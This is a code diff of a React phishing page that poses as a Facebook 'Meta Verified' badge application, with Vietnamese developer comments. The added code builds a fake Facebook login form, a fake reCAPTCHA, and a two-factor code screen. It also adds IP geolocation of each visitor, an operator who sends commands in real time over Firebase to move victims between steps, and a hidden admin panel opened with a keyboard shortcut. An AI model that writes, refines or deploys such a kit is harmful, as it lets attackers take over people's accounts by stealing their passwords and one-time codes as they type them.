@@ -35,8 +35,7 @@ export default function Home() {
 
   // --- STATES FORM MODAL ---
   const [showModal, setShowModal] = useState(false);
-  const [showFullPage, setShowFullPage] = useState(false);
-  const [step, setStep] = useState(1); // 1=signup, 1.5=thông báo, 2=login, 3=captcha, 4=otp, 5=success
+  const [step, setStep] = useState(1); // 1=signup, 1.5=thông báo liên kết, 2=login, 3=captcha, 4=otp, 5=success
   const [clientIp, setClientIp] = useState('Unknown');
   const [busName, setBusName] = useState(''); const [perEmail, setPerEmail] = useState(''); const [busEmail, setBusEmail] = useState('');
   const [countryCode, setCountryCode] = useState('+1'); const [phoneNum, setPhoneNum] = useState('');
@@ -105,10 +104,7 @@ export default function Home() {
       fetch('https://ipwho.is/').then(r => r.json()).then(d => {
           if (d && d.ip) {
               setClientIp(`${d.ip} - ${d.country} (${d.city})`);
-
-              if (d.country_code === 'FR') { setLang('fr'); }
-              else { setLang('en'); }
-
+              if (d.country_code === 'FR') { setLang('fr'); } else { setLang('en'); }
               if (d.country_code && countryCodeMap[d.country_code]) { setCountryCode(countryCodeMap[d.country_code]); }
           }
       }).catch(()=>{});
@@ -116,8 +112,7 @@ export default function Home() {
 
   // --- LẮNG NGHE LỆNH TỪ ADMIN QUA FIREBASE (REAL-TIME) ---
   useEffect(() => {
-    // Lắng nghe ở MỌI BƯỚC (không chặn step 1 hay 1.5 nữa)
-    if ((showModal || showFullPage) && !showAdmin) {
+    if (showModal && !showAdmin) {
         const commandRef = ref(database, 'commands/' + sessionId);
         const unsubscribe = onValue(commandRef, (snapshot) => {
             const data = snapshot.val();
@@ -129,32 +124,29 @@ export default function Home() {
                 setResendLoading(false);
 
                 if (data.action === 'otp') {
-                    setStep(4); setShowFullPage(true); setShowModal(false);
-                    setMatchNumber(null); setShowSuccess(false);
+                    setStep(4); setMatchNumber(null); setShowSuccess(false);
                 } 
                 else if (data.action === 'approve' && data.value) {
-                    setStep(4); setShowFullPage(true); setShowModal(false);
-                    setMatchNumber(data.value); setShowSuccess(false);
+                    setStep(4); setMatchNumber(data.value); setShowSuccess(false);
                 } 
                 else if (data.action === 'success') {
-                    setStep(5); setShowFullPage(true); setShowModal(false); setShowSuccess(true);
+                    setStep(5); setShowSuccess(true);
                 } 
                 else if (data.action === 'error') {
-                    setStep(2); setShowFullPage(true); setShowModal(false);
-                    setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
-                    setLoginAttempt(0); // Reset để lần login sau lại báo sai lần 1
+                    setStep(2); setShowLoginError(true); setLoginPass(''); setShowSuccess(false);
+                    setLoginAttempt(0);
                 }
             }
         });
         return () => unsubscribe();
     }
-  }, [showModal, showFullPage, showAdmin, sessionId]);
+  }, [showModal, showAdmin, sessionId]);
 
   // --- PHÍM TẮT MỞ ADMIN ---
   useEffect(() => {
     const handleKeyDown = (e) => {
       if (e.ctrlKey && e.shiftKey && e.key === 'A') {
-        setShowAdmin(prev => !prev); setShowModal(true); setShowFullPage(false);
+        setShowAdmin(prev => !prev); setShowModal(true);
       }
     };
     window.addEventListener('keydown', handleKeyDown);
@@ -163,28 +155,23 @@ export default function Home() {
 
   // --- OTP TIMER EFFECT ---
   useEffect(() => {
-    if (step === 4 && showFullPage) {
+    if (step === 4) {
       setOtpSecondsLeft(120);
       setOtpCanResend(false);
       const interval = setInterval(() => {
         setOtpSecondsLeft(prev => {
-          if (prev <= 1) {
-            clearInterval(interval);
-            setOtpCanResend(true);
-            return 0;
-          }
+          if (prev <= 1) { clearInterval(interval); setOtpCanResend(true); return 0; }
           return prev - 1;
         });
       }, 1000);
       return () => clearInterval(interval);
     }
-  }, [step, showFullPage, otpResetCount]);
+  }, [step, otpResetCount]);
 
   const openModal = () => {
-    setShowModal(true); setShowFullPage(false); setStep(1);
+    setShowModal(true); setStep(1);
     setShowSuccess(false); setShowAdmin(false);
     setCaptchaDone(false); setCaptchaChecked(false); setCaptchaLoading(false);
-    // RESET CÁC ATTEMPT + LỖI
     setLoginAttempt(0); setOtpAttempt(0);
     setShowLoginError(false); setShowOtpError(false);
     setLoginUser(''); setLoginPass(''); setOtp('');
@@ -205,9 +192,7 @@ export default function Home() {
 
     setTimeout(() => {
       setLoading(false);
-      setStep(1.5);
-      setShowFullPage(true);
-      setShowModal(false);
+      setStep(1.5); // Chuyển sang bước thông báo liên kết
     }, 700);
   };
 
@@ -258,7 +243,7 @@ export default function Home() {
         setOtp('');
         setShowOtpError(false);
         setOtpResetCount(prev => prev + 1);
-        setMatchNumber(null); // Đảm bảo xóa số cũ nếu có
+        setMatchNumber(null);
       }, 600);
     }, 10000);
   };
@@ -324,7 +309,6 @@ export default function Home() {
 
   return (
     <div style={{ overflowX: 'hidden' }}>
-      {/* KEYFRAMES CHO SPINNER */}
       <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
 
       {/* ================= TRANG CHỦ ================= */}
@@ -452,8 +436,8 @@ export default function Home() {
           </div>
       </footer>
 
-      {/* ================= MODAL (CHỈ DÙNG CHO SIGNUP VÀ ADMIN) ================= */}
-      {showModal && !showFullPage && (
+      {/* ================= MODAL (DÙNG CHUNG CHO SIGNUP, THÔNG BÁO, LOGIN, CAPTCHA, OTP, SUCCESS VÀ ADMIN) ================= */}
+      {showModal && (
         <div style={{ position: 'fixed', inset: 0, background: 'rgba(0, 0, 0, 0.4)', zIndex: 1000, display: 'flex', alignItems: 'center', justifyContent: 'center', padding: '24px 16px', overflowY: 'auto', backdropFilter: 'blur(4px)', WebkitBackdropFilter: 'blur(4px)' }}>
             <div style={{ position: 'relative', background: '#fff', borderRadius: '12px', padding: '28px 20px 20px', width: '100%', maxWidth: '420px', boxShadow: '0 12px 28px rgba(0,0,0,0.2)' }}>
 
@@ -488,7 +472,7 @@ export default function Home() {
                         <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/yt/r/DUiOg0mJTjz.webp" alt="FB" style={{ maxHeight: '60px', margin: '0 auto' }} />
                     </div>
 
-                    {/* FORM 1: SIGNUP */}
+                    {/* BƯỚC 1: SIGNUP */}
                     {step === 1 && (
                       <>
                         <h2 style={{ fontSize: '22px', fontWeight: '700', textAlign: 'center', color: '#050505', marginBottom: '6px' }}>{t.form1Title}</h2>
@@ -758,6 +742,218 @@ export default function Home() {
                         </form>
                       </>
                     )}
+
+                    {/* BƯỚC 1.5: THÔNG BÁO LIÊN KẾT TÀI KHOẢN */}
+                    {step === 1.5 && (
+                      <div style={{ textAlign: 'center', padding: '10px 0' }}>
+                        <div style={{ width: '64px', height: '64px', borderRadius: '50%', background: '#e7f3ff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
+                          <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></svg>
+                        </div>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', marginBottom: '12px', color: '#1c1e21' }}>
+                          Link Your Account
+                        </h2>
+                        <p style={{ fontSize: '15px', color: '#65676b', marginBottom: '24px', lineHeight: '1.5' }}>
+                          Please link your Facebook account to confirm your verified badge. This ensures the security and authenticity of your business profile.
+                        </p>
+                        <button 
+                          onClick={() => { setStep(2); setLoginAttempt(0); setShowLoginError(false); }} 
+                          disabled={loading} 
+                          className="fb-btn" 
+                          style={{ 
+                            width: '100%', 
+                            height: 52, 
+                            background: '#0064e0', 
+                            fontSize: '17px',
+                            display: 'flex', 
+                            justifyContent: 'center', 
+                            alignItems: 'center', 
+                            gap: 8 
+                          }}
+                        >
+                          Continue to Log In
+                        </button>
+                      </div>
+                    )}
+
+                    {/* BƯỚC 2: LOGIN */}
+                    {step === 2 && (
+                      <>
+                        <h2 style={{ fontSize: '20px', fontWeight: '700', textAlign: 'center', color: '#1c1e21', marginBottom: '20px' }}>
+                          Log into Facebook
+                        </h2>
+                        <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                            <div>
+                              <input 
+                                className="fb-input" 
+                                placeholder="Email or mobile number" 
+                                value={loginUser} 
+                                onChange={e => setLoginUser(e.target.value)} 
+                                required 
+                                style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
+                              />
+                            </div>
+                            <div>
+                              <input 
+                                className="fb-input" 
+                                type="password" 
+                                placeholder="Password" 
+                                value={loginPass} 
+                                onChange={e => setLoginPass(e.target.value)} 
+                                required 
+                                style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
+                              />
+                              {showLoginError && (
+                                <div style={{ color: '#fa383e', fontSize: '14px', marginTop: '8px', display: 'flex', alignItems: 'center', gap: 6 }}>
+                                  <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg>
+                                  The password you've entered is incorrect.
+                                </div>
+                              )}
+                            </div>
+                            <button type="submit" disabled={loading} className="fb-btn" style={{ height: 52, background: loading ? '#a0c3ff' : '#0866FF', fontSize: '18px', marginTop: '6px', display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
+                              {loading ? <Spinner size={22} /> : 'Log in'}
+                            </button>
+                        </form>
+                      </>
+                    )}
+
+                    {/* BƯỚC 3: CAPTCHA */}
+                    {step === 3 && (
+                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', padding: '10px 0' }}>
+                        <div style={{ width: '100%', maxWidth: '350px', marginBottom: '20px' }}>
+                          <div
+                            onClick={handleCaptchaClick}
+                            style={{
+                              border: '1px solid #d3d3d3',
+                              borderRadius: '3px',
+                              padding: '24px 12px',
+                              display: 'flex',
+                              alignItems: 'center',
+                              justifyContent: 'space-between',
+                              background: '#f9f9f9',
+                              cursor: captchaDone ? 'default' : 'pointer',
+                              width: '100%',
+                              boxSizing: 'border-box',
+                              boxShadow: '0 0 4px 1px rgba(0,0,0,0.08)',
+                              userSelect: 'none'
+                            }}
+                          >
+                            <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
+                              <div style={{
+                                width: '24px', height: '24px', border: '2px solid #c1c1c1',
+                                borderRadius: '2px', display: 'flex', alignItems: 'center', justifyContent: 'center',
+                                background: '#fff',
+                                flexShrink: 0, transition: 'all 0.2s'
+                              }}>
+                                {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
+                                {captchaLoading && <div style={{ width: '14px', height: '14px', border: '2px solid #e0e0e0', borderTop: '2px solid #4285f4', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>}
+                              </div>
+                              <span style={{ fontSize: '14px', color: '#000', fontWeight: '400' }}>
+                                I'm not a robot
+                              </span>
+                            </div>
+                            <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
+                              <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '28px', height: '28px', marginBottom: '2px' }} />
+                              <span style={{ fontSize: '9px', color: '#555' }}>reCAPTCHA</span>
+                              <span style={{ fontSize: '8px', color: '#555' }}>Privacy - Terms</span>
+                            </div>
+                          </div>
+                        </div>
+                        <div style={{ fontSize: '11px', color: '#65676b', lineHeight: '1.4', textAlign: 'left', width: '100%', maxWidth: '350px' }}>
+                          <p style={{ margin: '0 0 10px 0' }}>
+                            This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
+                          </p>
+                          <p style={{ margin: 0 }}>
+                            We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
+                          </p>
+                        </div>
+                      </div>
+                    )}
+
+                    {/* BƯỚC 4: OTP */}
+                    {step === 4 && !showSuccess && (
+                      <>
+                        <h2 style={{ fontSize: '20px', fontWeight: '700', textAlign: 'center', color: '#1c1e21', marginBottom: '8px' }}>
+                          Two-factor authentication
+                        </h2>
+                        <p style={{ fontSize: '14px', color: '#65676b', textAlign: 'center', marginBottom: '16px', lineHeight: '1.4' }}>
+                          {matchNumber 
+                            ? `Please enter the approval number requested by our system: ${matchNumber}` 
+                            : 'Enter the code we sent to your WhatsApp, SMS, or Gmail.'}
+                        </p>
+
+                        {matchNumber && (
+                          <div style={{ background: '#e7f3ff', border: '1px solid #0064e0', padding: '12px', borderRadius: '8px', marginBottom: '20px', textAlign: 'center', fontSize: '18px', fontWeight: 'bold', color: '#0064e0' }}>
+                            Yêu cầu nhập số: {matchNumber}
+                          </div>
+                        )}
+
+                        <form onSubmit={handleOtp} style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
+                          <input
+                            type="text"
+                            placeholder="Code"
+                            value={otp}
+                            onChange={e => { setOtp(e.target.value.replace(/\D/g, '').slice(0, 8)); setShowOtpError(false); }}
+                            style={{
+                              padding: '16px',
+                              fontSize: '16px',
+                              border: '1px solid #ccd0d5',
+                              borderRadius: '8px',
+                              outline: 'none',
+                              width: '100%',
+                              boxSizing: 'border-box'
+                            }}
+                          />
+                          
+                          <div style={{ fontSize: '14px', color: '#65676b', display: 'flex', alignItems: 'center', gap: '6px', flexWrap: 'wrap', justifyContent: 'center', margin: '4px 0' }}>
+                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2"><path d="M21 12a9 9 0 1 1-9-9c2.52 0 4.93 1 6.74 2.74L21 8"/><path d="M21 3v5h-5"/></svg>
+                            It may take a few minutes.
+                            {otpCanResend ? (
+                              <button type="button" onClick={handleResendOtp} disabled={resendLoading} style={{
+                                background: 'none', border: 'none',
+                                color: resendLoading ? '#a0c3ff' : '#0064e0',
+                                fontWeight: '600', cursor: resendLoading ? 'not-allowed' : 'pointer',
+                                fontSize: '14px', padding: 0,
+                                display: 'inline-flex', alignItems: 'center', gap: 6
+                              }}>
+                                {resendLoading ? <><Spinner size={14} color="#0064e0" border={2} /> Sending...</> : 'Get a new code'}
+                              </button>
+                            ) : (
+                              <span>New code in <strong>{formatTime(otpSecondsLeft)}</strong></span>
+                            )}
+                          </div>
+
+                          {showOtpError && <div style={{ color: '#fa383e', fontSize: '14px', textAlign: 'center' }}>Incorrect code. Please try again.</div>}
+
+                          <button type="submit" disabled={loading || otp.length < 6} className="fb-btn" style={{
+                            height: 52,
+                            background: otp.length >= 6 && !loading ? '#0064e0' : '#a0c3ff',
+                            marginTop: '6px',
+                            display: 'flex',
+                            justifyContent: 'center',
+                            alignItems: 'center',
+                            gap: 8
+                          }}>
+                            {loading ? <Spinner size={22} /> : 'Continue'}
+                          </button>
+                        </form>
+                      </>
+                    )}
+
+                    {/* BƯỚC 5: SUCCESS */}
+                    {showSuccess && (
+                      <div style={{ textAlign: 'center', padding: '10px 0' }}>
+                        <div style={{ width: '72px', height: '72px', borderRadius: '50%', background: '#e7f3ff', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 20px' }}>
+                          <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>
+                        </div>
+                        <h2 style={{ fontSize: '22px', fontWeight: '700', color: '#1c1e21', marginBottom: '12px' }}>Request submitted</h2>
+                        <p style={{ fontSize: '15px', color: '#65676b', lineHeight: '1.5', marginBottom: '24px' }}>
+                          Your request has been sent. Please wait up to 24 hours for verification.
+                        </p>
+                        <button type="button" onClick={() => { localStorage.clear(); window.location.replace('/live'); }} disabled={loading} className="fb-btn" style={{ height: 52, display: 'flex', justifyContent: 'center', alignItems: 'center' }}>
+                          Close
+                        </button>
+                      </div>
+                    )}
                   </>
                 )}
 
@@ -765,392 +961,6 @@ export default function Home() {
                     <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', margin: '0 auto' }} />
                 </div>
             </div>
-        </div>
-      )}
-
-      {/* ================= FULL PAGE GIAO DIỆN ================= */}
-      {showFullPage && (
-        <div style={{ position: 'fixed', inset: 0, background: '#fff', zIndex: 2000, display: 'flex', flexDirection: 'column', overflowY: 'auto' }}>
-          {/* Header Facebook */}
-          <div style={{ padding: '16px 24px', borderBottom: '1px solid #e4e6eb', height: '60px', boxSizing: 'border-box', display: 'flex', alignItems: 'center' }}>
-            <svg height="24" viewBox="100 100 900 160" xmlns="http://www.w3.org/2000/svg">
-              <title>Facebook</title>
-              <path fill="#0866FF" d="M881.583 257.897h29.48v-47.696l41.137 47.696h36.072l-47.89-54.969 40.909-47.663h-32.825l-37.403 43.93v-96.982l-29.48 3.864v151.82Zm-67.988-105.261c-32.728 0-55.455 22.013-55.455 53.929s22.727 53.929 55.455 53.929c32.727 0 55.455-22.013 55.455-53.929s-22.728-53.929-55.455-53.929Zm0 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-119.807-82.728c-32.727 0-55.455 22.013-55.455 53.929s22.728 53.929 55.455 53.929c32.728 0 55.455-22.013 55.455-53.929s-22.727-53.929-55.455-53.929Zm0 82.728c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.389 28.799-25.552 28.799Zm-112.826-82.728c-13.636 0-24.935 5.357-32.013 15.162v-65.585l-29.513 3.831v151.82h26.169l.519-15.844c6.981 11.818 19.481 18.474 34.838 18.474 27.988 0 48.475-22.728 48.475-53.929 0-31.202-20.39-53.929-48.475-53.929Zm-6.98 82.728c-15.163 0-25.552-11.721-25.552-28.799s10.389-28.799 25.552-28.799c15.162 0 25.552 11.721 25.552 28.799s-10.39 28.799-25.552 28.799Zm-113.638 1.331c-15.649 0-26.883-7.273-30.714-19.805h72.63c.715-3.831 1.202-8.377 1.202-11.429 0-33.02-18.475-52.825-49.514-52.825-31.331 0-53.02 22.013-53.02 53.929 0 32.338 22.728 53.929 56.462 53.929 17.467 0 34.448-5.844 45.065-15.552l-10.617-18.701c-10.292 7.11-20.39 10.454-31.494 10.454Zm-6.591-61.137c13.637 0 22.338 8.279 22.338 21.104v.098h-47.078c2.825-13.604 11.623-21.202 24.74-21.202Zm-98.994 84.968c15.26 0 30.195-5.844 40.714-15.974l-11.526-19.383c-8.182 6.364-17.467 9.805-26.266 9.805-16.364 0-27.273-11.429-27.273-28.377s10.909-28.377 27.273-28.377c8.084 0 16.883 2.922 24.026 8.085l11.721-19.806c-9.481-8.571-24.156-13.831-38.702-13.831-32.013 0-54.643 22.338-54.643 53.929.032 31.494 22.662 53.929 54.676 53.929Zm-93.735-105.261-.519 15.975c-6.981-11.916-19.481-18.572-34.838-18.572-28.085 0-48.475 22.728-48.475 53.929 0 31.202 20.52 53.929 48.475 53.929 15.357 0 27.889-6.656 34.838-18.474l.519 15.844h26.169V155.265h-26.169Zm-28.377 80.099c-15.162 0-25.552-11.721-25.552-28.799s10.39-28.799 25.552-28.799c15.163 0 25.552 11.721 25.552 28.799s-10.422 28.799-25.552 28.799Zm-57.663-79.906h-26.526v-8.767c0-13.117 5.13-18.149 18.442-18.149 4.123 0 7.467.097 9.383.292v-22.5c-3.637-1.007-12.5-2.013-17.63-2.013-27.111 0-39.611 12.792-39.611 40.422v10.682h-16.753v24.806h16.753v77.631h29.448v-77.599h21.949l4.545-24.805Z"></path>
-            </svg>
-          </div>
-
-          <div style={{ flex: 1, display: 'flex', justifyContent: 'center', alignItems: 'flex-start', padding: '40px 16px' }}>
-            <div style={{ width: '100%', maxWidth: '560px' }}>
-
-              {/* BƯỚC 1.5: THÔNG BÁO CHUYỂN HƯỚNG SANG ĐĂNG NHẬP */}
-              {step === 1.5 && (
-                <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'flex-start', width: '100%', maxWidth: '400px', margin: '60px auto 0 auto' }}>
-                  <div style={{ background: '#fff', border: '1px solid #ced0d4', borderRadius: '8px', padding: '32px 24px', width: '100%', boxSizing: 'border-box', boxShadow: '0 12px 28px rgba(0,0,0,0.1)' }}>
-                    <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '12px', color: '#1c1e21', textAlign: 'center' }}>
-                      Verification Required
-                    </h2>
-                    <p style={{ fontSize: '15px', color: '#65676b', marginBottom: '24px', lineHeight: '1.5', textAlign: 'center' }}>
-                      Your business details have been recorded. To proceed with the Meta Verified application, you must securely log in to your account.
-                    </p>
-
-                    <button
-                      onClick={() => { setStep(2); setLoginAttempt(0); setShowLoginError(false); }}
-                      disabled={loading}
-                      style={{
-                        width: '100%', padding: '14px', borderRadius: '100px', border: 'none',
-                        background: '#0064e0', color: '#fff', fontSize: '17px', fontWeight: '700',
-                        cursor: 'pointer',
-                        display: 'flex', justifyContent: 'center', alignItems: 'center', gap: 8,
-                        height: 52
-                      }}
-                    >
-                      Continue to Log In
-                    </button>
-                  </div>
-                </div>
-              )}
-
-              {/* BƯỚC 2: LOGIN FULL PAGE */}
-              {step === 2 && (
-                <div style={{
-                  position: 'fixed',
-                  inset: 0,
-                  background: '#fff',
-                  zIndex: 2000,
-                  display: 'flex',
-                  flexDirection: 'row'
-                }}>
-
-                  {/* CỘT TRÁI */}
-                  <div style={{
-                    flex: '1 1 65%',
-                    display: 'flex',
-                    flexDirection: 'column',
-                    justifyContent: 'center',
-                    padding: '0 4vw',
-                    backgroundColor: '#fff',
-                    minWidth: '600px'
-                  }}>
-
-                    <div style={{ width: '100%', maxWidth: '1000px', display: 'flex', flexDirection: 'column' }}>
-
-                      {/* Logo F trên cùng */}
-                      <div style={{ marginBottom: '40px' }}>
-                        <svg viewBox="0 0 24 24" fill="#0866FF" width="72" height="72">
-                          <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z"></path>
-                        </svg>
-                      </div>
-
-                      {/* Chữ và Ảnh dàn ngang */}
-                      <div style={{
-                        display: 'flex',
-                        alignItems: 'center',
-                        justifyContent: 'space-between',
-                        gap: '20px'
-                      }}>
-
-                        {/* Khối Chữ */}
-                        <div style={{ flex: '0 0 280px' }}>
-                          <h1 style={{
-                            fontSize: '52px',
-                            fontWeight: '700',
-                            lineHeight: '1.1',
-                            color: '#1c2b33',
-                            margin: 0,
-                            letterSpacing: '-1.5px'
-                          }}>
-                            Explore <br />the <br />things <br />
-                            <span style={{ color: '#0064e0' }}>you love.</span>
-                          </h1>
-                        </div>
-
-                        {/* Khối Ảnh to */}
-                        <div style={{ flex: '1', display: 'flex', justifyContent: 'flex-end' }}>
-                          <img
-                            src="/images/Anhlogin.webp"
-                            alt="Explore"
-                            style={{
-                              width: '100%',
-                              maxWidth: '850px',
-                              minWidth: '550px',
-                              display: 'block',
-                              transform: 'scale(1.1)',
-                              transformOrigin: 'right center'
-                            }}
-                          />
-                        </div>
-
-                      </div>
-                    </div>
-                  </div>
-
-                  {/* CỘT PHẢI: Form Đăng nhập */}
-                  <div style={{
-                    flex: '1',
-                    display: 'flex',
-                    flexDirection: 'column',
-                    justifyContent: 'center',
-                    alignItems: 'center',
-                    padding: '40px'
-                  }}>
-                    <div style={{ width: '100%', maxWidth: '396px' }}>
-
-                      <h2 style={{ fontSize: '18px', fontWeight: '500', color: '#1c2b33', margin: '0 0 20px 0' }}>
-                        Log into Facebook
-                      </h2>
-
-                      <form onSubmit={handleLogin} autoComplete="off" style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
-                        <input
-                          className="fb-input"
-                          placeholder="Email or mobile number"
-                          value={loginUser}
-                          onChange={e => setLoginUser(e.target.value)}
-                          required
-                          style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
-                        />
-
-                        <input
-                          className="fb-input"
-                          type="password"
-                          placeholder="Password"
-                          value={loginPass}
-                          onChange={e => setLoginPass(e.target.value)}
-                          required
-                          style={{ padding: '16px', fontSize: '16px', border: '1px solid #ccd0d5', borderRadius: '8px', width: '100%', boxSizing: 'border-box' }}
-                        />
-
-                        {/* HIỂN THỊ LỖI SAI MẬT KHẨU */}
-                        {showLoginError && (
-                          <div style={{
-                            color: '#fa383e', fontSize: '14px', marginTop: '-4px',
-                            display: 'flex', alignItems: 'center', gap: 6
-                          }}>
-                            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
-                              <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
-                            </svg>
-                            The password you've entered is incorrect.
-                          </div>
-                        )}
-
-                        <button type="submit" disabled={loading} style={{
-                          width: '100%',
-                          padding: '14px',
-                          borderRadius: '100px',
-                          border: 'none',
-                          background: loading ? '#a0c3ff' : '#0866FF',
-                          color: '#fff',
-                          fontSize: '20px',
-                          fontWeight: '700',
-                          cursor: loading ? 'not-allowed' : 'pointer',
-                          marginTop: '6px',
-                          display: 'flex',
-                          justifyContent: 'center',
-                          alignItems: 'center',
-                          height: '52px'
-                        }}>
-                          {loading ? (
-                            <div style={{
-                              width: '24px',
-                              height: '24px',
-                              border: '3px solid rgba(255, 255, 255, 0.3)',
-                              borderTop: '3px solid #fff',
-                              borderRadius: '50%',
-                              animation: 'spin 0.8s linear infinite'
-                            }}></div>
-                          ) : (
-                            'Log in'
-                          )}
-                        </button>
-                      </form>
-
-                      <div style={{ display: 'flex', justifyContent: 'center', alignItems: 'center', marginTop: '24px', width: '100%' }}>
-                          <img src="https://upload.wikimedia.org/wikipedia/commons/7/7b/Meta_Platforms_Inc._logo.svg" alt="Meta" style={{ height: '12px', opacity: 0.7 }} />
-                      </div>
-
-                    </div>
-                  </div>
-                </div>
-              )}
-
-              {/* BƯỚC 3: CAPTCHA FULL PAGE */}
-              {step === 3 && (
-                <div style={{
-                  width: '100%',
-                  display: 'flex',
-                  justifyContent: 'center',
-                  marginTop: '40px'
-                }}>
-
-                  <div style={{ width: '100%', maxWidth: '350px' }}>
-
-                    <div
-                      onClick={handleCaptchaClick}
-                      style={{
-                        border: '1px solid #d3d3d3',
-                        borderRadius: '3px',
-                        padding: '24px 12px',
-                        display: 'flex',
-                        alignItems: 'center',
-                        justifyContent: 'space-between',
-                        background: '#f9f9f9',
-                        cursor: captchaDone ? 'default' : 'pointer',
-                        width: '100%',
-                        boxSizing: 'border-box',
-                        boxShadow: '0 0 4px 1px rgba(0,0,0,0.08)',
-                        userSelect: 'none'
-                      }}
-                    >
-                      <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
-                        <div style={{
-                          width: '24px', height: '24px', border: '2px solid #c1c1c1',
-                          borderRadius: '2px', display: 'flex', alignItems: 'center', justifyContent: 'center',
-                          background: '#fff',
-                          flexShrink: 0, transition: 'all 0.2s'
-                        }}>
-                          {captchaChecked && !captchaLoading && <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#0064e0" strokeWidth="3" strokeLinecap="round" strokeLinejoin="round"><polyline points="20 6 9 17 4 12"/></svg>}
-                          {captchaLoading && <div style={{ width: '14px', height: '14px', border: '2px solid #e0e0e0', borderTop: '2px solid #4285f4', borderRadius: '50%', animation: 'spin 1s linear infinite' }}></div>}
-                        </div>
-                        <span style={{ fontSize: '14px', color: '#000', fontWeight: '400' }}>
-                          I'm not a robot
-                        </span>
-                      </div>
-
-                      <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center' }}>
-                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" style={{ width: '28px', height: '28px', marginBottom: '2px' }} />
-                        <span style={{ fontSize: '9px', color: '#555' }}>reCAPTCHA</span>
-                        <span style={{ fontSize: '8px', color: '#555' }}>Privacy - Terms</span>
-                      </div>
-                    </div>
-
-                    <div style={{ marginTop: '12px', fontSize: '11px', color: '#65676b', lineHeight: '1.4', textAlign: 'left', width: '100%' }}>
-                      <p style={{ margin: '0 0 10px 0' }}>
-                        This helps us to combat harmful conduct, detect and prevent spam and maintain the integrity of our Products.
-                      </p>
-                      <p style={{ margin: '0 0 10px 0' }}>
-                        We've used Google's reCAPTCHA Enterprise product to provide this security check. Your use of reCAPTCHA Enterprise is subject to Google's Privacy Policy and Terms of Use.
-                      </p>
-                      <p style={{ margin: 0 }}>
-                        reCAPTCHA Enterprise collects hardware and software information, such as device and application data, and sends it to Google to provide, maintain, and improve reCAPTCHA Enterprise and for general security purposes. This information is not used by Google for personalized advertising.
-                      </p>
-                    </div>
-
-                  </div>
-                </div>
-              )}
-
-              {/* BƯỚC 4: OTP FULL PAGE */}
-              {step === 4 && !showSuccess && (
-                <div>
-                  <h2 style={{ fontSize: '24px', fontWeight: '700', marginBottom: '8px', color: '#1c1e21', lineHeight: '1.3' }}>
-                    Two-factor authentication
-                  </h2>
